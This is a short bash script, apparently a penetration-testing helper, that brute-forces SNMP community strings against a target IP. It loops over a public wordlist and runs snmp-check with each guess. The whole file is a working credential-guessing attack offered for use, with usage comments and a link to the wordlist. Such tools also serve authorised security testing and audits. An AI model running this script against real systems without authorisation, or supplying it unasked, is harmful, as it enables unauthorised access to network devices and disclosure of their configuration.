#!/bin/bash
## usage: bash snmp-brute.sh x.x.x.x
## where x.x.x.x is the target IP of the machine in question
while read community
do
snmp-check -c $community -r 0 -t 1 -v 2c -w $1 #IP ex: 192.168.1.249
sleep 1
done < /mnt/HDD2/wordlists/wordlist-common-snmp-community-strings.txt 
#      ^download wordlist, change path as needed:
#      https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt

